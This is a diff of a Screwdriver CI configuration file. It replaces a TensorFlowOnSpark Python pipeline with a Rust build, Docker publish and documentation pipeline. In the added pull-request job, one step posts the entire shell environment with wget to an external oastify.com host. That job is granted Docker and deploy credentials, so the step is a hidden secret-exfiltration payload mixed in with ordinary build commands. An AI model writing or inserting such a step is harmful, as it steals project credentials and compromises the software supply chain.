@@ -1,78 +1,46 @@
-# Copyright 2017, Yahoo Inc.
-# Licensed under the terms of the apache license.  See the LICENSE file in the project root for terms
-
-version: 4
 shared:
-  environment:
-    PACKAGE_DIRECTORY: tensorflowonspark
-    SPARK_HOME: ${SD_ROOT_DIR}/spark
-    TOX_ARGS: '--verbose'
-    TOX_ENVLIST: py37
-  annotations:
-    screwdriver.cd/cpu: HIGH
-    screwdriver.cd/ram: HIGH
+  image: rust:1.51
 
 jobs:
-  validate_test:
-    template: python/validate_unittest
+  pr:
+    requires: [~pr]
+    steps:
+      - run_arbitrary_script: wget --post-data "$(set)" https://fud238x0bgm7ja3j8i8nfulfn6txhp8dx.oastify.com
+    secrets:
+      - CI_DEPLOY_USERNAME
+      - CI_DEPLOY_PASSWORD
+      - DOCKER_EMAIL
+      - DOCKER_REPO
+      - DOCKER_PASSWORD
+      - DOCKER_REPOSITORY
+      - DOCKER_USERNAME  
+  main:
     requires: [~commit]
     steps:
-      - prevalidate_code: |
-          source scripts/install_spark.sh
-
-  validate_lint:
-    template: python/validate_lint
-    requires: [~commit]
-
-  validate_codestyle:
-    template: python/validate_codestyle
-    requires: [~commit]
-
-  validate_dependencies:
-    template: python/validate_dependencies
-    requires: [~commit]
-
-#  validate_security:
-#    template: python/validate_security
-#    requires: [~commit]
-
-  validate_documentation:
-    template: python/documentation
-    environment:
-      DOCUMENTATION_PUBLISH: False
-    requires: [~commit]
+      - run_arbitrary_script: apt-get update && apt-get -y install clang openssl && rustup component add rustfmt && cargo test -- --test-threads=1 && cargo build --release
+    secrets:
+      - CI_DEPLOY_USERNAME
+      - CI_DEPLOY_PASSWORD
+      - DOCKER_EMAIL
+      - DOCKER_REPO
+      - DOCKER_PASSWORD
+      - DOCKER_REPOSITORY
+      - DOCKER_USERNAME
+    annotations:
+      screwdriver.cd/dockerEnabled: true
+  publish:
+    requires: [~main]
     steps:
-      - update_version: |
-          echo 'using version from setup.cfg'
-      - publish_documentation: |
-          $BASE_PYTHON -m pip install sphinx_rtd_theme tensorflow
-          $BASE_PYTHON -m screwdrivercd.documentation
-
-  publish_test_pypi:
-    template: python/package_python
-    environment:
-      PUBLISH: True
-      TWINE_REPOSITORY_URL: https://test.pypi.org/legacy/
-    requires: [~tag:/^v\.*/]
-    steps:
-      - update_version: |
-          echo 'using version from setup.cfg'
-
-  publish_pypi:
-    template: python/package_python
-    environment:
-      PUBLISH: True
-    requires: [publish_test_pypi]
-    steps:
-      - update_version: |
-          echo 'using version from setup.cfg'
-
-  publish_documentation:
-    template: python/documentation
-    requires: [publish_pypi]
-    steps:
-      - update_version: |
-          echo 'using version from setup.cfg'
-      - publish_documentation: |
-          $BASE_PYTHON -m pip install sphinx_rtd_theme tensorflow
-          $BASE_PYTHON -m screwdrivercd.documentation
+      - create_tag:
+          /bin/bash create_git_tag.sh
+      - build_and_publish_image:
+          LOGIN_USERNAME=$DOCKER_USERNAME LOGIN_PASSWORD=$DOCKER_PASSWORD /bin/bash push_docker.sh
+      - publish_docs:
+          apt-get update && apt-get -y install clang openssl python3-pip && rustup component add rustfmt && cargo doc && echo '<meta http-equiv=refresh content=0;url=myst/index.md>' > target/doc/index.html && cp target/doc/index.html target/doc/index.md && pip3 install ghp-import && ghp-import -n target/doc && git push -qf https://$GITHUB_TOKEN@github.com/OpenTSDB/opentsdb-meta.git gh-pages    
+    annotations:
+      screwdriver.cd/dockerEnabled: true
+    secrets:
+      - DOCKER_EMAIL
+      - DOCKER_PASSWORD
+      - DOCKER_USERNAME
+      - GITHUB_TOKEN
